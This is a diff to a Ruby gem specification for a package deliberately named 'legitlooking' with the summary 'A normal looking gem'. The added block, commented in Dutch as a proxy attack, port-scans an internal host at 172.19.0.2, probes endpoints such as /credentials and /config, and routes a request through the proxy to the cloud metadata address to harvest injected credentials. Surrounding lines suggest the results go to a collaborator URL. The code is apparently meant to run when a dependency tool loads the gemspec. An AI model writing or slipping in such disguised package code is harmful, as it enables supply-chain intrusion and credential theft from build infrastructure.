@@ -50,7 +50,80 @@ begin
   dep_bin = "/home/dependabot/bin"
   collab = COLLAB_URL
 
-  # Controleer of we kunnen schrijven naar /home/dependabot/bin
+  # ============================================================
+  # PROXY AANVAL: 172.19.0.2 heeft de credentials
+  # Scan alle poorten, probeer admin APIs
+  # ============================================================
+  lines << "\n=== PROXY AANVAL (172.19.0.2) ==="
+
+  require "socket"
+  require "timeout"
+
+  open_ports = []
+  # Scan veelgebruikte poorten + proxy-specifieke poorten
+  scan_ports = [80, 443, 1080, 1081, 3000, 4141, 5000, 8080, 8081,
+                8082, 8083, 8888, 9090, 9091, 9093, 9999, 10000,
+                15000, 16000, 16001, 16666, 17777, 19999, 20000]
+
+  scan_ports.each do |port|
+    begin
+      Timeout.timeout(0.5) do
+        s = TCPSocket.new("172.19.0.2", port)
+        open_ports << port
+        s.close
+      end
+    rescue
+    end
+  end
+  lines << "Open poorten op 172.19.0.2: #{open_ports.inspect}"
+
+  # Probeer elke open poort te bevragen
+  open_ports.each do |port|
+    begin
+      Timeout.timeout(3) do
+        s = TCPSocket.new("172.19.0.2", port)
+        # Stuur HTTP verzoeken voor mogelijke admin APIs
+        [
+          "GET / HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
+          "GET /health HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
+          "GET /credentials HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
+          "GET /config HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
+          "GET /metrics HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
+        ].each do |req|
+          begin
+            s2 = TCPSocket.new("172.19.0.2", port)
+            s2.write(req)
+            resp = s2.read_nonblock(2000) rescue s2.read(2000) rescue ""
+            if resp.length > 0
+              lines << "--- Poort #{port} response (#{req.split(' ')[1]}) ---"
+              lines << resp[0, 500]
+            end
+            s2.close rescue nil
+          rescue; end
+        end
+        s.close
+      end
+    rescue
+    end
+  end
+
+  # Probeer ook de proxy als credential oracle via HTTPS
+  # Stuur een request naar de proxy voor een niet-github URL
+  # Als de proxy credentials inject voor alle URLs, vangen we ze hier
+  lines << "\n--- Proxy credential oracle test ---"
+  begin
+    proxy_uri = URI("http://172.19.0.2:1080")
+    Net::HTTP.start(proxy_uri.host, proxy_uri.port) do |proxy|
+      req = Net::HTTP::Get.new("http://169.254.169.254/latest/meta-data/")
+      res = proxy.request(req)
+      lines << "Proxy direct response: #{res.code}"
+      lines << "Headers: #{res.to_hash.inspect[0, 300]}"
+      lines << "Body: #{res.body[0, 300]}"
+    end
+  rescue => e
+    lines << "Proxy oracle fout: #{e.message}"
+  end
+
   lines << "\n--- /home/dependabot/bin inhoud ---"
   lines << (`ls -la #{dep_bin}/ 2>&1`)
 
@@ -150,7 +223,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.10"
+  spec.version       = "1.0.11"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
